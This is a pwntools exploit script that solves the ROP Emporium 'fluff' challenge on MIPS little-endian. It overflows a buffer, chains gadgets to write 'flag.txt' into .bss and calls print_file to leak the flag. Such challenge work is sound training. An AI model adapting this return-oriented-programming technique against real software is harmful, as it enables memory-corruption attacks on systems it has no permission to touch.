#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time


# ROPemporium fluff MIPSEL

# Set up pwntools for the correct architecture
elf = context.binary = ELF('fluff_mipsel')
context.terminal=["/usr/bin/xterm", "-fa", "Monospace", "-fs","12", "-e"]

# ret : 296
# read  : 248
gs='''
b *pwnme+296
c
'''

# Gadgets
# 0x00400aac : lw $ra, 0x24($sp) ; lw $s1, 0x20($sp) ; lw $s0, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x28
g_pop_s1s0= 0x00400aac

# 0x0040099c : lw $t9, 4($sp) ; sw $s1, ($s0) ; jalr $t9 ; addi $sp, $sp, 8
g_write_s1s0 = 0x0040099c

g_call_with_a0 = 0x004009ac


if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


print_file = elf.plt["print_file"]+4
bssaddr = elf.get_section_by_name('.bss').header['sh_addr']

log.info(f"{bssaddr=:x}")
log.info(f"{print_file=:x}")

offset=0x24

PL=b"A"*offset
# first gadget write "flag"
PL+=p32(g_pop_s1s0)    
PL+=p32(0xdeadbeef)        # junk
PL+=p32(0xdeadbeef)        # junk
PL+=p32(0xdeadbeef)        # junk
PL+=p32(0xdeadbeef)        # junk
PL+=p32(0xdeadbeef)        # junk
PL+=p32(0xdeadbeef)        # junk
PL+=p32(0xdeadbeef)        # junk
PL+=p32(bssaddr)           # t0
PL+=b'flag'                # t1
PL+=p32(g_write_s1s0)      # t9 => next gadget
PL+=p32(0xdeadbeef)        # junk

# Second gadget write ".txt"
PL+=p32(g_pop_s1s0)        # t9 for g_write_s1s0    
PL+=p32(0xdeadbeef)        # junk
PL+=p32(0xdeadbeef)        # junk
PL+=p32(0xdeadbeef)        # junk
PL+=p32(0xdeadbeef)        # junk
PL+=p32(0xdeadbeef)        # junk
PL+=p32(0xdeadbeef)        # junk
PL+=p32(0xdeadbeef)        # junk
PL+=p32(bssaddr+4)         # t0
PL+=b'.txt'                # t1
PL+=p32(g_write_s1s0)      # t9 => next gadget
PL+=p32(0xdeadbeef)        # junk

PL+=p32(g_call_with_a0)    # t9 => next gadget for g_write_s1s0
PL+=p32(0xdeadbeef)        # junk
PL+=p32(print_file)        # t9
PL+=p32(bssaddr)           # t0

log.info(f"Payload size : 0x{len(PL):x}")
log.info(PL.hex())
io.sendlineafter(b"> ",PL)

io.recvuntil(b"ROPE")
flag=io.recvline().decode()
log.success(f"flag : ROPE{flag}")
io.close()

